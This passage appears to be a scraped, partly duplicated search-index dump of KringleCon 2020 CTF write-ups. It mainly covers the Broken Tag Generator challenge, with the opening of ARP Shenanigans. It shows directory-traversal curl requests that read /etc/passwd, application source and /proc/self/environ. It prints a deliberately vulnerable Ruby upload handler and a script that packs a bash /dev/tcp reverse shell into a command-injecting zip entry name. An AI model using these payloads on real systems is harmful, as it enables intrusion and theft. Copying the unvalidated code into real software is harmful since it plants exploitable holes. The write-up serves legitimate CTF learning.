0 hosts scanned. Nmap done: 0 IP addresses (0 hosts up) scanned in 0.13 seconds root@kali:~/kringlecon20/challenges/08-broken-tag-generator# Step 02 It doesn't look like we can do much from the network end. Let's try finding the web app's directories. We can run DIRB against https://tag-generator.kringlecastle.com/ and grab a coffee while we're waiting for the results. root@kali:~/kringlecon20/challenges/08-broken-tag-generator# dirb https://tag-generator.kringlecastle.com/ ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Jan 9 20:21:59 2021 URL_BASE: https://tag-generator.kringlecastle.com/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: https://tag-generator.kringlecastle.com/ ---- + https://tag-generator.kringlecastle.com/clear (CODE:302|SIZE:) + https://tag-generator.kringlecastle.com/image (CODE:501|SIZE:80) + https://tag-generator.kringlecastle.com/share (CODE:501|SIZE:80) ----------------- END_TIME: Sat Jan 9 20:35:06 2021 DOWNLOADED: 4612 - FOUND: 3 root@kali:~/kringlecon20/challenges/08-broken-tag-generator# /clear seems to be something we can explore. Step 03 We can also run ZAP against https://tag-generator.kringlecastle.com/ to find directories, files, and potential vulnerabilities/weaknesses. It looks like there's a DOM-based XSS vulnerability that could also possibly be a directory traversal vulnerability. Additionally, it seems like the web app uses a vulnerable jquery version (v3.3.1). Additional endpoints that we may be interested in exploring are: /images/ and /js/app.js Step 04 We can manually explore what we've found. Let's first look at /clear Looks like /clear just redirects to / . Step 05 Let's look at /images Looks like we're not able to access the /images directory directly, but are able to GET the files within that directory. However, the 404 message shows that /app/lib/app.rb does all the routing. After trying to GET https://tag-generator.kringlecastle.com/app/lib/app.rb we receive the same 404. Step 06 We're also given the non-broken app's URI. Looking at both the broken and non-broken source codes, we can find a <script src=\"js/app.js\"></script> tag that links to the web apps' js, showing that the /js/app endpoint we fuzzed is loaded in the HTML. We can then download their respective javascript source and run diff to find the differences between the broken and non-broken web apps. root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# diff -y broken-app.js unbroken-app.js | less There doesn't seem to be any exceptionally interesting differences besides that the broken app console.log s form and data info when using the click event for an input file. Therefore, we can use the console on the broken app to see what the form and data look like when we try to upload a file. Step 07 Let's try uploading a file to see what happens in the console. So it looks like uploading a file returns a POST request to /upload . The interesting thing is, the POST request returns a .png id, which is then sent to a GET request for /image?id=....png . Therefore, since the app for some reason returns an ID just to look it up, it may be possible to find other files using /image?id= Step 08 Since we know (from the browser) that the web app is running on nginx/1.14.2 and thus is likely to be on a linux system, let's try /image?id=../../../../etc/passwd root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin app:x:1000:1000:,,,:/home/app:/bin/bash root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# Step 09 Since directory traversal works, let's try to get the one file that we know exists: root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../app/lib/app.rb # encoding: ASCII-8BIT TMP_FOLDER = '/tmp' FINAL_FOLDER = '/tmp' # Don't put the uploads in the application folder Dir.chdir TMP_FOLDER require 'rubygems' require 'json' require 'sinatra' require 'sinatra/base' require 'singlogger' require 'securerandom' require 'zip' require 'sinatra/cookies' require 'cgi' require 'digest/sha1' LOGGER = ::SingLogger.instance() MAX_SIZE = 1024**2*5 # 5mb # Manually escaping is annoying, but Sinatra is lightweight and doesn't have # stuff like this built in :( def h(html) CGI.escapeHTML html end def handle_zip(filename) LOGGER.debug(\"Processing #{ filename } as a zip\") out_files = [] Zip::File.open(filename) do |zip_file| # Handle entries one by one zip_file.each do |entry| LOGGER.debug(\"Extracting #{entry.name}\") if entry.size > MAX_SIZE raise 'File too large when extracted' end if entry.name().end_with?('zip') raise 'Nested zip files are not supported!' end # I wonder what this will do? --Jack # if entry.name !~ /^[a-zA-Z0-9._-]+$/ # raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen' # end # We want to extract into TMP_FOLDER out_file = \"#{ TMP_FOLDER }/#{ entry.name }\" # Extract to file or directory based on name in the archive entry.extract(out_file) { # If the file exists, simply overwrite true } # Process it out_files << process_file(out_file) end end return out_files end def handle_image(filename) out_filename = \"#{ SecureRandom.uuid }#{File.extname(filename).downcase}\" out_path = \"#{ FINAL_FOLDER }/#{ out_filename }\" # Resize and compress in the background Thread.new do if !system(\"convert -resize 800x600\\\\> -quality 75 '#{ filename }' '#{ out_path }'\") LOGGER.error(\"Something went wrong with file conversion: #{ filename }\") else LOGGER.debug(\"File successfully converted: #{ filename }\") end end # Return just the filename - we can figure that out later return out_filename end def process_file(filename) out_files = [] if filename.downcase.end_with?('zip') # Append the list returned by handle_zip out_files += handle_zip(filename) elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png') # Append the name returned by handle_image out_files << handle_image(filename) else raise \"Unsupported file type: #{ filename }\" end return out_files end def process_files(files) return files.map { |f| process_file(f) }.flatten() end module TagGenerator class Server < Sinatra::Base helpers Sinatra::Cookies def initialize(*args) super(*args) end configure do if(defined?(PARAMS)) set :port, PARAMS[:port] set :bind, PARAMS[:host] end set :raise_errors, false set :show_exceptions, false end error do return 501, erb(:error, :locals => { message: \"Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }\" }) end not_found do return 404, erb(:error, :locals => { message: \"Error in #{ __FILE__ }: Route not found\" }) end get '/' do erb(:index) end post '/upload' do images = [] images += process_files(params['my_file'].map { |p| p['tempfile'].path }) images.sort!() images.uniq!() content_type :json images.to_json end get '/clear' do cookies.delete(:images) redirect '/' end get '/image' do if !params['id'] raise 'ID is missing!' end # Validation is boring! --Jack # if params['id'] !~ /^[a-zA-Z0-9._-]+$/ # return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen' # end content_type 'image/jpeg' filename = \"#{ FINAL_FOLDER }/#{ params['id'] }\" if File.exists?(filename) return File.read(filename) else return 404, \"Image not found!\" end end get '/share' do if !params['id'] raise 'ID is missing!' end filename = \"#{ FINAL_FOLDER }/#{ params['id'] }.png\" if File.exists?(filename) erb(:share, :locals => { id: params['id'] }) else return 404, \"Image not found!\" end end post '/save' do payload = params payload = JSON.parse(request.body.read) data_url = payload['dataURL'] png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1]) out_hash = Digest::SHA1.hexdigest png out_filename = \"#{ out_hash }.png\" out_path = \"#{ FINAL_FOLDER }/#{ out_filename }\" LOGGER.debug(\"output: #{out_path}\") File.open(out_path, 'wb') { |f| f.write(png) } { id: out_hash }.to_json end end end Weaponization Step 10 Looks like if we upload a .zip ( handle_zip ), the web app will extract the .zip and save each file in the archive to TMP_FOLDER/file , where TMP_FOLDER is /tmp . Each file's name is unescaped, courtesy of Jack Frost. Each file is then sent to process_file . Sounds like a zipslip vulnerability . In other words, we should be able to do RCE if the extracted value calls a command (e.g. /tmp/; <RCE here> ). Therefore, let's create a zipfile that contains a file with a reverse shell name. root@kali:~/kringlecon20/challenges/08-broken-tag-generator# python3 code/weaponize.py # weaponize.py ip_address = '127.0.0.1' # currently on localhost, change when needed port = '1337' # bash reverse shell rs = \"/bin/bash -i 1>& /dev/tcp/\" + ip_address + \"/\" + port + \" 0>&1\" filename = \"'; \" + rs + \"; 'foo.png\" with zp.ZipFile('payloads/rce.zip', 'w') as z: z.writestr(filename, 'poop') Delivery Step 11 Let's spin up a netcat listener for port 1337 on our VM root@kali:~/kringlecon20/challenges/08-broken-tag-generator# nc -nvlp 1337 And upload the payload through the web app and wait for the code to execute. After hours of debugging, it turns out that I can't make connections back to my attacking machine. Since I disabled all the firewalls and the reverse shell works when tested on an LAN, the connection issue is probably due to my router configuration blocking specific incoming connections. Step 12 Let's try an LFI approach instead of the RCE approach above and thus do some directory traversal. According to Alex North-Keys & Gautam Chibde , processes can view environment variables via ps or via looking a /proc/*/environ . Since we can only use curl to view files, /proc/*/environ may be the best way to approach this. Using this site from linux.com as a guideline to /proc : root@kali:~/kringlecon20/challenges/08-broken-tag-generator/# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../proc/cmdline BOOT_IMAGE=/boot/vmlinuz-4.19.0-13-cloud-amd64 root=UUID=27007375-5b74-4fcf-afc6-962faabdffb7 ro console=tty0 console=ttyS0,115200 earlyprintk=ttyS0,115200 scsi_mod.use_blk_mq=Y root@kali:~/kringlecon20/challenges/08-broken-tag-generator/# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../proc/self/environ --output - PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app Flag JackFrostWasHere","title":"Objective 08"},{"location":"challenges/08-broken-tag-generator/#challenge-08-broken-tag-generator","text":"","title":"Challenge 08 -  Broken Tag Generator"},{"location":"challenges/08-broken-tag-generator/#challenge","text":"Difficulty: 4/5 Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.","title":"Challenge"},{"location":"challenges/08-broken-tag-generator/#solution","text":"","title":"Solution"},{"location":"challenges/08-broken-tag-generator/#recon","text":"","title":"Recon"},{"location":"challenges/08-broken-tag-generator/#step-01","text":"Let's start with finding some info about https://tag-generator.kringlecastle.com root@kali:~/kringlecon20/challenges/08-broken-tag-generator# ping https://tag-generator.kringlecastle.com/ ping: https://tag-generator.kringlecastle.com/: Name or service not known root@kali:~/kringlecon20/challenges/08-broken-tag-generator# dig @8.8.8.8 https://tag-generator.kringlecastle.com/ ; <<>> DiG 9.16.8-Debian <<>> @8.8.8.8 https://tag-generator.kringlecastle.com/ ; (1 server found) ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 44841 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: dffe19b9049e3c2e5f6a443a5ffa54852a0e11faf92a208e (good) ;; QUESTION SECTION: ;https://tag-generator.kringlecastle.com/. IN A ;; AUTHORITY SECTION: . 600 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2021010901 1800 900 604800 86400 ;; Query time: 16 msec ;; SERVER: 8.8.8.8#53(8.8.8.8) ;; WHEN: Sat Jan 09 20:12:37 EST 2021 ;; MSG SIZE rcvd: 172 root@kali:~/kringlecon20/challenges/08-broken-tag-generator# nmap 35.232.236.115:443 # received from browser Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 18:00 PST Failed to resolve \"35.232.236.115:443\". WARNING: No targets were specified, so 0 hosts scanned. Nmap done: 0 IP addresses (0 hosts up) scanned in 0.13 seconds root@kali:~/kringlecon20/challenges/08-broken-tag-generator#","title":"Step 01"},{"location":"challenges/08-broken-tag-generator/#step-02","text":"It doesn't look like we can do much from the network end. Let's try finding the web app's directories. We can run DIRB against https://tag-generator.kringlecastle.com/ and grab a coffee while we're waiting for the results. root@kali:~/kringlecon20/challenges/08-broken-tag-generator# dirb https://tag-generator.kringlecastle.com/ ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Jan 9 20:21:59 2021 URL_BASE: https://tag-generator.kringlecastle.com/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: https://tag-generator.kringlecastle.com/ ---- + https://tag-generator.kringlecastle.com/clear (CODE:302|SIZE:) + https://tag-generator.kringlecastle.com/image (CODE:501|SIZE:80) + https://tag-generator.kringlecastle.com/share (CODE:501|SIZE:80) ----------------- END_TIME: Sat Jan 9 20:35:06 2021 DOWNLOADED: 4612 - FOUND: 3 root@kali:~/kringlecon20/challenges/08-broken-tag-generator# /clear seems to be something we can explore.","title":"Step 02"},{"location":"challenges/08-broken-tag-generator/#step-03","text":"We can also run ZAP against https://tag-generator.kringlecastle.com/ to find directories, files, and potential vulnerabilities/weaknesses. It looks like there's a DOM-based XSS vulnerability that could also possibly be a directory traversal vulnerability. Additionally, it seems like the web app uses a vulnerable jquery version (v3.3.1). Additional endpoints that we may be interested in exploring are: /images/ and /js/app.js","title":"Step 03"},{"location":"challenges/08-broken-tag-generator/#step-04","text":"We can manually explore what we've found. Let's first look at /clear Looks like /clear just redirects to / .","title":"Step 04"},{"location":"challenges/08-broken-tag-generator/#step-05","text":"Let's look at /images Looks like we're not able to access the /images directory directly, but are able to GET the files within that directory. However, the 404 message shows that /app/lib/app.rb does all the routing. After trying to GET https://tag-generator.kringlecastle.com/app/lib/app.rb we receive the same 404.","title":"Step 05"},{"location":"challenges/08-broken-tag-generator/#step-06","text":"We're also given the non-broken app's URI. Looking at both the broken and non-broken source codes, we can find a <script src=\"js/app.js\"></script> tag that links to the web apps' js, showing that the /js/app endpoint we fuzzed is loaded in the HTML. We can then download their respective javascript source and run diff to find the differences between the broken and non-broken web apps. root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# diff -y broken-app.js unbroken-app.js | less There doesn't seem to be any exceptionally interesting differences besides that the broken app console.log s form and data info when using the click event for an input file. Therefore, we can use the console on the broken app to see what the form and data look like when we try to upload a file.","title":"Step 06"},{"location":"challenges/08-broken-tag-generator/#step-07","text":"Let's try uploading a file to see what happens in the console. So it looks like uploading a file returns a POST request to /upload . The interesting thing is, the POST request returns a .png id, which is then sent to a GET request for /image?id=....png . Therefore, since the app for some reason returns an ID just to look it up, it may be possible to find other files using /image?id=","title":"Step 07"},{"location":"challenges/08-broken-tag-generator/#step-08","text":"Since we know (from the browser) that the web app is running on nginx/1.14.2 and thus is likely to be on a linux system, let's try /image?id=../../../../etc/passwd root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin app:x:1000:1000:,,,:/home/app:/bin/bash root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code#","title":"Step 08"},{"location":"challenges/08-broken-tag-generator/#step-09","text":"Since directory traversal works, let's try to get the one file that we know exists: root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../app/lib/app.rb # encoding: ASCII-8BIT TMP_FOLDER = '/tmp' FINAL_FOLDER = '/tmp' # Don't put the uploads in the application folder Dir.chdir TMP_FOLDER require 'rubygems' require 'json' require 'sinatra' require 'sinatra/base' require 'singlogger' require 'securerandom' require 'zip' require 'sinatra/cookies' require 'cgi' require 'digest/sha1' LOGGER = ::SingLogger.instance() MAX_SIZE = 1024**2*5 # 5mb # Manually escaping is annoying, but Sinatra is lightweight and doesn't have # stuff like this built in :( def h(html) CGI.escapeHTML html end def handle_zip(filename) LOGGER.debug(\"Processing #{ filename } as a zip\") out_files = [] Zip::File.open(filename) do |zip_file| # Handle entries one by one zip_file.each do |entry| LOGGER.debug(\"Extracting #{entry.name}\") if entry.size > MAX_SIZE raise 'File too large when extracted' end if entry.name().end_with?('zip') raise 'Nested zip files are not supported!' end # I wonder what this will do? --Jack # if entry.name !~ /^[a-zA-Z0-9._-]+$/ # raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen' # end # We want to extract into TMP_FOLDER out_file = \"#{ TMP_FOLDER }/#{ entry.name }\" # Extract to file or directory based on name in the archive entry.extract(out_file) { # If the file exists, simply overwrite true } # Process it out_files << process_file(out_file) end end return out_files end def handle_image(filename) out_filename = \"#{ SecureRandom.uuid }#{File.extname(filename).downcase}\" out_path = \"#{ FINAL_FOLDER }/#{ out_filename }\" # Resize and compress in the background Thread.new do if !system(\"convert -resize 800x600\\\\> -quality 75 '#{ filename }' '#{ out_path }'\") LOGGER.error(\"Something went wrong with file conversion: #{ filename }\") else LOGGER.debug(\"File successfully converted: #{ filename }\") end end # Return just the filename - we can figure that out later return out_filename end def process_file(filename) out_files = [] if filename.downcase.end_with?('zip') # Append the list returned by handle_zip out_files += handle_zip(filename) elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png') # Append the name returned by handle_image out_files << handle_image(filename) else raise \"Unsupported file type: #{ filename }\" end return out_files end def process_files(files) return files.map { |f| process_file(f) }.flatten() end module TagGenerator class Server < Sinatra::Base helpers Sinatra::Cookies def initialize(*args) super(*args) end configure do if(defined?(PARAMS)) set :port, PARAMS[:port] set :bind, PARAMS[:host] end set :raise_errors, false set :show_exceptions, false end error do return 501, erb(:error, :locals => { message: \"Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }\" }) end not_found do return 404, erb(:error, :locals => { message: \"Error in #{ __FILE__ }: Route not found\" }) end get '/' do erb(:index) end post '/upload' do images = [] images += process_files(params['my_file'].map { |p| p['tempfile'].path }) images.sort!() images.uniq!() content_type :json images.to_json end get '/clear' do cookies.delete(:images) redirect '/' end get '/image' do if !params['id'] raise 'ID is missing!' end # Validation is boring! --Jack # if params['id'] !~ /^[a-zA-Z0-9._-]+$/ # return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen' # end content_type 'image/jpeg' filename = \"#{ FINAL_FOLDER }/#{ params['id'] }\" if File.exists?(filename) return File.read(filename) else return 404, \"Image not found!\" end end get '/share' do if !params['id'] raise 'ID is missing!' end filename = \"#{ FINAL_FOLDER }/#{ params['id'] }.png\" if File.exists?(filename) erb(:share, :locals => { id: params['id'] }) else return 404, \"Image not found!\" end end post '/save' do payload = params payload = JSON.parse(request.body.read) data_url = payload['dataURL'] png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1]) out_hash = Digest::SHA1.hexdigest png out_filename = \"#{ out_hash }.png\" out_path = \"#{ FINAL_FOLDER }/#{ out_filename }\" LOGGER.debug(\"output: #{out_path}\") File.open(out_path, 'wb') { |f| f.write(png) } { id: out_hash }.to_json end end end","title":"Step 09"},{"location":"challenges/08-broken-tag-generator/#weaponization","text":"","title":"Weaponization"},{"location":"challenges/08-broken-tag-generator/#step-10","text":"Looks like if we upload a .zip ( handle_zip ), the web app will extract the .zip and save each file in the archive to TMP_FOLDER/file , where TMP_FOLDER is /tmp . Each file's name is unescaped, courtesy of Jack Frost. Each file is then sent to process_file . Sounds like a zipslip vulnerability . In other words, we should be able to do RCE if the extracted value calls a command (e.g. /tmp/; <RCE here> ). Therefore, let's create a zipfile that contains a file with a reverse shell name. root@kali:~/kringlecon20/challenges/08-broken-tag-generator# python3 code/weaponize.py # weaponize.py ip_address = '127.0.0.1' # currently on localhost, change when needed port = '1337' # bash reverse shell rs = \"/bin/bash -i 1>& /dev/tcp/\" + ip_address + \"/\" + port + \" 0>&1\" filename = \"'; \" + rs + \"; 'foo.png\" with zp.ZipFile('payloads/rce.zip', 'w') as z: z.writestr(filename, 'poop')","title":"Step 10"},{"location":"challenges/08-broken-tag-generator/#delivery","text":"","title":"Delivery"},{"location":"challenges/08-broken-tag-generator/#step-11","text":"Let's spin up a netcat listener for port 1337 on our VM root@kali:~/kringlecon20/challenges/08-broken-tag-generator# nc -nvlp 1337 And upload the payload through the web app and wait for the code to execute. After hours of debugging, it turns out that I can't make connections back to my attacking machine. Since I disabled all the firewalls and the reverse shell works when tested on an LAN, the connection issue is probably due to my router configuration blocking specific incoming connections.","title":"Step 11"},{"location":"challenges/08-broken-tag-generator/#step-12","text":"Let's try an LFI approach instead of the RCE approach above and thus do some directory traversal. According to Alex North-Keys & Gautam Chibde , processes can view environment variables via ps or via looking a /proc/*/environ . Since we can only use curl to view files, /proc/*/environ may be the best way to approach this. Using this site from linux.com as a guideline to /proc : root@kali:~/kringlecon20/challenges/08-broken-tag-generator/# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../proc/cmdline BOOT_IMAGE=/boot/vmlinuz-4.19.0-13-cloud-amd64 root=UUID=27007375-5b74-4fcf-afc6-962faabdffb7 ro console=tty0 console=ttyS0,115200 earlyprintk=ttyS0,115200 scsi_mod.use_blk_mq=Y root@kali:~/kringlecon20/challenges/08-broken-tag-generator/# curl https://tag-generator.kringlecastle.com/image\\?id\\=../../../../proc/self/environ --output - PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app","title":"Step 12"},{"location":"challenges/08-broken-tag-generator/#flag","text":"JackFrostWasHere","title":"Flag"},{"location":"challenges/09-arp-shenanigans/","text":"Challenge 09 - ARP Shenanigans Challenge Difficulty: 4/5 Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document? Shell Jack Frost has hijacked the host at 10.6.6.35 with some custom malware. Help the North Pole by getting command line access back to this host. Read the HELP.md file for information to help you in this endeavor. Note: The terminal lifetime expires after 30 or more minutes so be sure to copy off any essential work you have done as you go. guest@321e48198541:~$ Solution Note: changes from hostname are due to exiting and entering terminal Recon Step 01 Let's first see what kind of environment we're working with. guest@21925e0c7e13:~$ ll total 40 drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ./ drwxr-xr-x 1 root root 4096 Nov 30 18:57 ../ -rw-r--r-- 1 guest guest 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 guest guest 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 guest guest 807 Feb 25 2020 .profile -rw-r--r-- 1 guest guest 830 Dec 5 00:00 HELP.md drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 debs/ lrwxrwxrwx 1 guest guest 9 Dec 7 21:11 motd -> /etc/motd drwxr-xr-x 1 guest guest 4096 Dec 1 15:27 pcaps/ drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 scripts/ guest@21925e0c7e13:~$ ifconfig eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST> mtu 1500 inet 10.6.0.4 netmask 255.255.0.0 broadcast 10.6.255.255 ether 02:42:0a:06:00:04 txqueuelen 0 (Ethernet) RX packets 34 bytes 1748 (1.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 guest@21925e0c7e13:~$ ping 10.6.6.35 PING 10.6.6.35 (10.6.6.35) 56(84) bytes of data. 64 bytes from 10.6.6.35: icmp_seq=1 ttl=64 time=0.169 ms 64 bytes from 10.6.6.35: icmp_seq=2 ttl=64 time=0.097 ms 64 bytes from 10.6.6.35: icmp_seq=3 ttl=64 time=0.091 ms 64 bytes from 10.6.6.35: icmp_seq=4 ttl=64 time=0.094 ms 64 bytes from 10.6.6.35: icmp_seq=5 ttl=64 time=0.111 ms ^C --- 10.6.6.35 ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 4076ms rtt min/avg/max/mdev = 0.091/0.112/0.169/0.029 ms guest@21925e0c7e13:~$ cd debs/; ll total 2556 drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 ./ drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../ -rw-r--r-- 1 guest guest 94748 Dec 5 00:00 gedit-common_3.36.1-1_all.deb -rw-r--r-- 1 guest guest 14484 Dec 5 00:00 golang-github-huandu-xstrings-dev_1.2.1-1_all.deb -rw-r--r-- 1 guest guest 269332 Dec 5 00:00 nano_4.8-1ubuntu1_amd64.deb -rw-r--r-- 1 guest guest 61504 Dec 5 00:00 netcat-traditional_1.10-41.1ubuntu1_amd64.deb -rw-r--r-- 1 guest guest 1662268 Dec 5 00:00 nmap_7.80+dfsg1-2build1_amd64.deb -rw-r--r-- 1 guest guest 322680 Dec 5 00:00 socat_1.7.3.3-2_amd64.deb -rw-r--r-- 1 guest guest 168956 Dec 5 00:00 unzip_6.0-25ubuntu1_amd64.deb guest@21925e0c7e13:~/debs$ cd ../scripts/; ll total 16 drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 ./ drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../ -rwxr-xr-x 1 guest guest 1290 Dec 4 21:34 arp_resp.py* -rwxr-xr-x 1 guest guest 1526 Dec 7 21:10 dns_resp.py* guest@21925e0c7e13:~/scripts$ cd ../pcaps/; ll total 16 drwxr-xr-x 1 guest guest 4096 Dec 1 15:27 ./ drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../ -rw-r--r-- 1 guest guest 176 Nov 30 18:23 arp.pcap -rwxr-xr-x 1 guest guest 220 Nov 30 18:23 dns.pcap* guest@21925e0c7e13:~/pcaps$ So it looks like we have a bunch of traditional text editing tools, some utility tools, and some networking tools. We also have couple address resolution/domain name scripts and pcaps. We're also able to send ICMP packets to our target, so we should be able to start scanning it to see what we're dealing with. Step 02 Let's see what tools we can use guest@21925e0c7e13:~$ apt install debs/nmap_7.80+dfsg1-2build1_amd64.deb E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied) E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root? guest@21925e0c7e13:~$ find / -name *nmap* 2> /dev/null /home/guest/debs/nmap_7.80+dfsg1-2build1_amd64.deb /usr/local/lib/python3.8/dist-packages/scapy/modules/nmap.py /usr/local/lib/python3.8/dist-packages/scapy/modules/__pycache__/nmap.cpython-38.pyc /proc/sys/vm/min_unmapped_ratio guest@2f062415b43e:~$ which nc /usr/bin/nc guest@2f062415b43e:~$ which python guest@2f062415b43e:~$ which python3 /usr/bin/python3 guest@2f062415b43e:~$ which pip3 /usr/bin/pip3 guest@2f062415b43e:~$ which tcpdump /usr/sbin/tcpdump guest@2f062415b43e:~$ which wireshark guest@2f062415b43e:~$ which tshark /usr/bin/tshark guest@2f062415b43e:~$ cat scripts/arp_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"SOMEMACHERE\", type=0x806, src=\"SOMEMACHERE\") arp_response = ARP(pdst=\"SOMEMACHERE\") arp_response.op = 99999 arp_response.plen = 99999 arp_response.hwlen = 99999 arp_response.ptype = 99999 arp_response.hwtype = 